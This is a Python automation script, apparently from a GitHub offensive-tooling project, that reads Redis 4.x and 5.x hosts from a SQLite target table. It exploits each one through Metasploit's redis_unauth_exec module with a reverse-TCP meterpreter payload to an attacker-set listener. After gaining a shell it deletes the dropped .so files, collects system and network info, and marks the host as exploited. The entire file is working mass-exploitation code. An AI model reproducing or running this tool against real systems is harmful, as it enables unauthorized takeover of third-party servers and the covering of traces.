#!/usr/bin/python3
# coding=utf-8

import sqlite3
import multiprocessing
from pymetasploit3.msfrpc import MsfRpcClient
import subprocess
import time

# ---------------------修改这4个反向连接的参数---------------------
# 填写外网监听端口，建议80
gl_lport = '80'
# redis被欺骗的反向连接的外网IP
# 填写你自己的外网服务器IP
gl_srvhost = '127.0.0.1'
# redis被欺骗的反向连接的端口
# 填写你自己的外网监听端口，建议6379
gl_srvport = '6379'
# payload meterpreter shell反向连接的外网IP
# 填写你自己的外网服务器IP
gl_lhost = '127.0.0.1'
# payload meterpreter shell反向连接端口
# ---------------------修改这4个反向连接的参数---------------------

# exploit进程
gl_p_exploit = None

# exploit进程专用的全局变量，存储全部回显，供存入payload_info字段
gl_p_exploit_echo_all = ''

# exploit进程专用的全局变量，meterpreter对象，用于write和read
gl_p_exploit_meterpreter = None

# 定义数据库连接
gl_conn = None
# 定义查询用途游标
gl_cursor_query = None
# 定义更新用途游标
gl_cursor_update = None


# 初始化数据库
def init_sqlite():
    # 定义数据库连接
    global gl_conn
    # 定义查询用途游标
    global gl_cursor_query
    # 定义更新用途游标
    global gl_cursor_update

    # 初始化数据库
    gl_conn = sqlite3.connect("sqlite.db")
    # 连接数据库
    gl_cursor_query = gl_conn.cursor()
    gl_cursor_update = gl_conn.cursor()

    print("sqlite connected.")


# 释放数据库资源
def release_sqlite():
    # 定义数据库连接
    global gl_conn
    # 定义查询用途游标
    global gl_cursor_query
    # 定义更新用途游标
    global gl_cursor_update

    # 释放数据库资源
    try:
        if gl_cursor_query is not None:
            # 关闭游标
            gl_cursor_query.close()
    except Exception as e:
        print("gl_cursor_query.close() Error: {}".format(e))

    try:
        if gl_cursor_update is not None:
            # 关闭游标
            gl_cursor_update.close()
    except Exception as e:
        print("gl_cursor_update.close() Error: {}".format(e))

    try:
        if gl_conn is not None:
            # 关闭数据库连接
            gl_conn.close()
            print("database released.")
    except Exception as e:
        print("gl_conn.close() Error: {}".format(e))
        pass


# 在meterpreter的shell下运行命令，并回显
# 存储到gl_echo_all，备用存储到payload_info字段
def meterpreter_run_sleep_echo(str_cmd, i_sleep=0):

    global gl_p_exploit_meterpreter
    global gl_p_exploit_echo_all

    str_echo_temp = ''

    if gl_p_exploit_meterpreter is not None:
        # 写入命令
        gl_p_exploit_meterpreter.write(str_cmd)
        # 记录命令
        gl_p_exploit_echo_all = gl_p_exploit_echo_all + '\r\n\r\n' + str_cmd
        # 打印命令
        print(str_cmd)

        print('meterpreter_run_sleep_echo() time.sleep(' + str(i_sleep) + ')')
        time.sleep(i_sleep)

        str_echo_temp = gl_p_exploit_meterpreter.read()

        # 记录回显
        gl_p_exploit_echo_all = gl_p_exploit_echo_all + '\r\n\r\n' + str_echo_temp

        # 打印回显
        print(str_echo_temp)

    else:
        print('#' * 30, 'error: meterpreter is None', '#' * 30)

    return str_echo_temp


# 主要过程
def exploit(rhosts_in, rport_in, srvhost_in, srvport_in, lhost_in, lport_in):
    global gl_p_exploit_meterpreter
    global gl_p_exploit_echo_all
    global gl_cursor_update
    global gl_conn

    gl_p_exploit_meterpreter = None
    gl_p_exploit_echo_all = ''

    try:

        # 杀掉msfrpcd进程
        subp = subprocess.Popen("ps -aux|grep 'msfrpcd'|awk '{print $2}'|xargs kill -9", shell=True)
        subp.wait()

        print('kill msfrpcd.')

        # 启动msfrpcd，MSGRPC，必须加上-S参数
        # (base) root@kali:~# msfrpcd -P r0x1_y0ur9assw0rd -S -a 127.0.0.1
        # [*] MSGRPC starting on 127.0.0.1:55553 (NO SSL):Msg...
        # [*] MSGRPC ready at 2020-02-04 08:38:28 -0500.
        subp = subprocess.Popen("msfrpcd -P r0x1_y0ur9assw0rd -S -a 127.0.0.1", shell=True)
        subp.wait()
        # print('#pid: ', subp.pid)
        subp.terminate()

        # 睡眠10秒，等待服务器启动
        print('exploit() time.sleep(10)')
        time.sleep(10)

        # 连接MSGRPC，密码是上面的'r0x1_y0ur9assw0rd'
        client = MsfRpcClient('r0x1_y0ur9assw0rd')

        print('MsfRpcClient')

        # 加载redis_unauth_exec模块
        msf_exploit = client.modules.use('exploit', 'linux/redis/redis_unauth_exec')

        print("exploit = client.modules.use('exploit', 'linux/redis/redis_unauth_exec')")

        # 设置几个参数
        msf_exploit['RHOSTS'] = rhosts_in
        msf_exploit['RPORT'] = rport_in
        msf_exploit['SRVHOST'] = srvhost_in
        msf_exploit['SRVPORT'] = srvport_in

        # 加载payload，这里使用反向连接
        msf_payload = client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
        # 设置payload的参数
        msf_payload['LHOST'] = lhost_in
        msf_payload['LPORT'] = lport_in

        print('exploit.runoptions: ', msf_exploit.runoptions)

        # 创建控制台，并获取id
        console_id = client.consoles.console().cid
        console = client.consoles.console(console_id)

        # console.is_busy()
        print('exploit host [{0}:{1}]...'.format(rhosts_in, rport_in))

        # run
        echo_str = console.run_module_with_output(msf_exploit, msf_payload)
        gl_p_exploit_echo_all = echo_str
        print(echo_str)

        # 失败1
        if 'but no session was created' in echo_str:
            print('>' * 10, 'exploit failed...no session was created', '<' * 10)

        elif '[!]' in echo_str and 'created in the background' in echo_str:
            # [*] Session 3 created in the background.
            # 成功
            if len(client.sessions.list) > 0:
                print('maybe got session')
                gl_p_exploit_meterpreter = None

                print('sessions.list: ', str(client.sessions.list.keys()))

                str_begin = "[*] Session "
                str_end = " created in the background."

                if str_begin in echo_str and str_end in echo_str:
                    str_session_id = echo_str[echo_str.find(str_begin) + len(str_begin): echo_str.find(str_end)]
                    # for item in client.sessions.list.keys():

                    print('select session : [' + str_session_id + '], length: ' + str(len(str_session_id)))

                    gl_p_exploit_meterpreter = client.sessions.session(str_session_id)

                    # 查询banner
                    print('? to list help banner')
                    str_banner = meterpreter_run_sleep_echo('?', 3)

                    # 如果banner中，出现了'File system Commands'，证明成功了
                    if str_banner is not None and 'Stdapi: File system Commands' in str_banner:

                        print('>' * 10, 'got meterpreter shell', '<' * 10)

                        # 获得so文件名称
                        # This exploit may require manual cleanup of './nbmbj.so' on the target
                        str_begin = "This exploit may require manual cleanup of './"
                        str_end = "' on the target"

                        if str_begin in echo_str and str_end in echo_str:
                            str_so_filename = echo_str[echo_str.find(
                                str_begin) + len(str_begin): echo_str.find(str_end)]

                            # 删除指定的so文件
                            cmd_str = 'rm ' + str_so_filename

                            # 运行，sleep 1秒，回显
                            meterpreter_run_sleep_echo(cmd_str, 1)

                        else:
                            # 没找到so文件名
                            print('#' * 10, 'exploit failed...no so file name', '#' * 10)

                        # 查询文件
                        cmd_str = 'ls -al'
                        meterpreter_run_sleep_echo(cmd_str, 3)

                        # 删除所有so文件，sleep 1秒，回显
                        cmd_str = 'rm -f *.so'
                        meterpreter_run_sleep_echo(cmd_str, 1)

                        # 查询文件
                        cmd_str = 'ls -al'
                        meterpreter_run_sleep_echo(cmd_str, 3)

                        # 查询sysinfo
                        cmd_str = 'sysinfo'
                        meterpreter_run_sleep_echo(cmd_str, 2)

                        # 查询ip
                        cmd_str = 'ifconfig'
                        meterpreter_run_sleep_echo(cmd_str, 2)

                        # 记录到数据库
                        # 将结果写入redis_target表
                        # 更新is_exploited=1
                        # 更新payload_info='gl_p_exploit_echo_all'

                        # 更新数据库，is_exploited = 1，写入payload信息
                        gl_cursor_update.execute(
                            "update redis_target set is_exploited=1, payload_info=? where ip=?",
                            (gl_p_exploit_echo_all, rhosts_in))
                        # 保存
                        gl_conn.commit()

                        print('>' * 30, 'update redis_target table... host {} is_exploited = 1'.format(rhosts_in),
                              '<' * 30)

                    else:
                        print('#' * 10, 'exploit failed...no Stdapi banner, no File system Commands banner', '#' * 10)

                    # 退出shell
                    cmd_str = 'exit'
                    gl_p_exploit_meterpreter.write(cmd_str)

                    gl_p_exploit_meterpreter.stop()

                    gl_p_exploit_meterpreter.kill()

                else:
                    # 没有找到session id
                    print('#' * 10, 'exploit failed...no session ID', '#' * 10)

                # 清空session
                client.sessions.list.clear()

        else:
            # 其他失败
            print('#' * 10, 'exploit failed...unknown error', '#' * 10)

        try:
            if console is not None:
                console.write('exit')
        except Exception as e:
            print("exploit() Exception : console.write('exit') Error: {}".format(e))
        try:
            if console is not None:
                console.destroy()
        except Exception as e:
            print("exploit() Exception : console.destroy() Error: {}".format(e))
        try:
            if client.sessions.list is not None and len(client.sessions.list) > 0:
                # 清空session
                client.sessions.list.clear()
        except Exception as e:
            print("exploit() Exception : client.sessions.list.clear() Error: {}".format(e))
        try:
            if client is not None:
                client.logout()
        except Exception as e:
            print("exploit() Exception : client.logout()Error: {}".format(e))

        # 杀掉msfrpcd进程
        subp = subprocess.Popen("ps -aux|grep 'msfrpcd'|awk '{print $2}'|xargs kill -9", shell=True)
        subp.wait()
        # 结束msfrpcd
        print('kill msfrpcd.')
        print('-' * 30, ' done. ', '-' * 30)
    except Exception as e:
        print("exploit() Error: {}".format(e))


# 终止exploit进程和资源
def kill_exploit_process():
    # exploit进程
    global gl_p_exploit

    try:
        # 尝试关闭进程
        gl_p_exploit.close()

        # 等待几秒
        print('kill_exploit_process() time.sleep(5)')
        time.sleep(5)
    except Exception as e:
        print("kill_exploit_process() : gl_p_exploit.close() 1st Error: {}".format(e))

    # 杀掉msfrpcd进程
    subp = subprocess.Popen("ps -aux|grep 'msfrpcd'|awk '{print $2}'|xargs kill -9", shell=True)
    subp.wait()
    print('kill msfrpcd.')

    print('kill msfrpcd() time.sleep(5)')
    time.sleep(5)

    try:
        # 尝试关闭进程
        gl_p_exploit.close()

        print('kill_exploit_process() time.sleep(1)')
        time.sleep(1)
    except Exception as e:
        print("kill_exploit_process() : gl_p_exploit.close() 2nd Error: {}".format(e))

    # 尝试kill进程
    try:
        gl_p_exploit.kill()
    except Exception as e:
        print("gl_p_exploit.kill() Error: {}".format(e))
    try:
        gl_p_exploit = None
    except Exception as e:
        print("gl_p_exploit = None Error: {}".format(e))


# 计时进程，中止超时的exploit进程
def timer(gl_p_exploit_begin_time, gl_exit_now):
    # exploit进程
    global gl_p_exploit

    while gl_exit_now.value == 0:

        # 计时的秒数
        time_second_value = time.time() - gl_p_exploit_begin_time.value
        # print('time_second_value: ', str(time_second_value))

        if gl_p_exploit is None:
            print('*' * 50, 'gl_p_exploit is None, new Process gl_p_exploit.start()', '*' * 50)
            # exploit进程
            gl_p_exploit = multiprocessing.Process(target=loop_target, args=(gl_p_exploit_begin_time, gl_exit_now))
            gl_p_exploit.daemon = True
            gl_p_exploit.start()

        # 如果单次检测时间大于120秒，则终止检测进程，继续检测下一个目标
        if time_second_value > 120:
            # 终止进程
            kill_exploit_process()

            # 重新设置时间，避免再次触发此终止进程方法
            gl_p_exploit_begin_time.value = time.time()
        else:
            pass

        # print('timer() time.sleep(5)')
        time.sleep(5)

    # 终止进程
    kill_exploit_process()
    # 释放数据库
    release_sqlite()


# 设置目标
def loop_target(gl_p_exploit_begin_time, gl_exit_now):
    # 定义更新用途游标
    global gl_cursor_update
    # 查询用途游标
    global gl_cursor_query

    try:

        # 死循环
        while gl_exit_now.value == 0:

            # 记录exploit开始运行的时间，大于设定的时间，则强制推出
            gl_p_exploit_begin_time.value = time.time()

            # 读取数据库
            # 这里只读取4.x版本和5.x版本的数据
            # is_exploited = 0 未连接
            # is_exploited = -1 已连接，未获得meterpreter shell
            # is_exploited = 1 已连接，已获得meterpreter shell

            # 从redis_target表中读取ip和端口
            # 查询is_exploited == 0，并且redis_version在4.x.x - 5.x.x之间的，都可以尝试连接

            gl_cursor_query.execute("SELECT ip, port FROM redis_target WHERE is_exploited=0 AND (redis_version like '4.%' or redis_version like '5.%') ORDER BY redis_version LIMIT 1")
            row = gl_cursor_query.fetchone()
            if row is not None and len(row) > 0:
                # 目标ip
                rhosts_temp = str(row[0])
                # 目标端口
                rport_temp = str(row[1])

                print('rhosts:', rhosts_temp, ', rport:', rport_temp)

                # 防止ip和端口有空数据
                if rhosts_temp is not None and len(rhosts_temp) > 0:
                    # 更新数据库，is_exploited = -1
                    gl_cursor_update.execute("update redis_target set is_exploited=-1 where ip='{}'".format(rhosts_temp))
                    # 保存
                    gl_conn.commit()

                    # 启动exploit
                    exploit(rhosts_temp, rport_temp, gl_srvhost, gl_srvport, gl_lhost, gl_lport)

            else:
                # 退出所有线程
                gl_exit_now.value = 1

    except Exception as e:
        print("loop_target() Error: {}".format(e))


def main():
    # exploit进程
    global gl_p_exploit

    # banner
    print("==============================================")
    print("|  5_exploit_target_redis_table.py (v0.0.1)  |")
    print("|    redis_unauth_exec_automation_script     |")
    print("|          https://github.com/r0x1/          |")
    print("==============================================")

    # 进程开始运行的时间
    gl_p_exploit_begin_time = multiprocessing.Value('d', time.time())

    # 计时进程，中止超时的exploit进程，
    gl_exit_now = multiprocessing.Value('i', 0)

    # 初始化数据库连接
    init_sqlite()

    # 在timer进程中会根据这个值启动exploit进程
    gl_p_exploit = None

    # 启动计时器
    timer(gl_p_exploit_begin_time, gl_exit_now)

    # 设置终止标识
    gl_exit_now.value = 1

    # 终止进程
    kill_exploit_process()
    # 释放数据库
    release_sqlite()


if __name__ == '__main__':
    main()
